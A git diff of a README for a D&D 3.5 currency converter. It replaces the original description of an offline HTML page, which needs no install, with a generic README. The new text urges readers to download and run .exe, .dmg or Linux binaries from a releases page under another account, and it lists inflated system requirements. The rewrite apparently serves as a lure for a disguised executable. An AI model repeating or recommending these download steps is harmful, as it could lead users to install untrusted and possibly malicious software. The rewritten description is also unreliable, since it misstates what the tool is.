@@ -1,9 +1,53 @@
-# D&D Currency Converter
-A basic currency calculator/converter based on D&amp;D [3.5/SRD](https://www.d20srd.org/srd/equipment/wealthAndMoney.htm)
+# 💰 dnd-currency-converter - Simple Currency Exchange for D&D
 
-This is a super simple currency converter/calculator for wealth and money, using the rules defined in the System Reference Document. This converter will calculate immediately as you type.
+## 📥 Download Now
+[![Download Here](https://img.shields.io/badge/Download%20Now-blue)](https://github.com/AmmarAhmeed/dnd-currency-converter/releases)
 
-# Usage
-This tool works straight out the box. Simply open the `dnd-currency-converter.html` file in your browser. This tool also works offline (no internet connection needed)
+## 🚀 Getting Started
+Welcome to the D&D Currency Converter! This application helps you convert between various currencies used in Dungeons & Dragons 3.5. With this tool, you can easily manage your in-game finances without the hassle of manual calculations.
 
-💟 Like this tool? Please consider supporting me. ☕ [Buy me a coffee](https://ko-fi.com/Knuxchan) 💖 [Donate via PayPal](https://www.paypal.com/donate/?hosted_button_id=FLKXR3HLB8EGG)
+### 🌟 Features
+- **Multiple Currencies**: Convert between several D&D currencies effortlessly.
+- **User-Friendly Interface**: Designed for ease of use. You don’t need to be a tech expert.
+- **Quick Calculations**: Get results in seconds.
+
+## 📋 System Requirements
+To run the D&D Currency Converter, you will need:
+- A computer with Windows, macOS, or Linux.
+- At least 512 MB of RAM.
+- 100 MB of free disk space.
+
+## 🛠️ Download & Install
+1. **Visit the Releases Page**: To download the currency converter, [visit this page to download](https://github.com/AmmarAhmeed/dnd-currency-converter/releases).
+2. **Choose Your Version**: On the Releases page, select the version that matches your operating system.
+3. **Download the File**: Click on the file to start downloading. The download will start automatically.
+
+## 📥 Step-by-Step Installation
+1. Once the download is complete, locate the file in your Downloads folder.
+2. If you are on Windows, double-click on the `.exe` file to start the installation.
+   - If you are on macOS, open the `.dmg` file and drag the application to your Applications folder.
+   - If you are on Linux, extract the files and run the application using your terminal.
+3. Follow any prompts that appear during installation.
+
+## ⚙️ How to Use
+1. Open the D&D Currency Converter application.
+2. Enter the amount you want to convert in the input box.
+3. Select the source currency from the dropdown menu.
+4. Choose the target currency where you want to convert the amount.
+5. Click the "Convert" button to see the results instantly.
+
+## 🔧 Troubleshooting
+- **Application Won't Start**: Ensure your system meets the requirements. Check if you have the latest version of your operating system.
+- **Incorrect Conversions**: Double-check the currencies selected. Ensure the amounts entered are correct.
+
+## 📖 Additional Resources
+- For detailed information about Dungeons & Dragons currencies, consider looking at the [System Reference Document](https://d20srd.org/).
+- Visit our [documentation page](https://github.com/AmmarAhmeed/dnd-currency-converter) for FAQs and user guides.
+
+## 🌐 Connect with Us
+If you have questions or suggestions, please reach out. We want to make this tool better for you.
+- **GitHub Issues**: Report any bugs or request features on our [GitHub Issues page](https://github.com/AmmarAhmeed/dnd-currency-converter/issues).
+- **Community Forums**: Join discussions with other users and get tips on using the converter effectively.
+
+## 👍 Thank You for Using dnd-currency-converter!
+We appreciate your interest in our application. Happy adventuring in your Dungeons & Dragons campaigns!
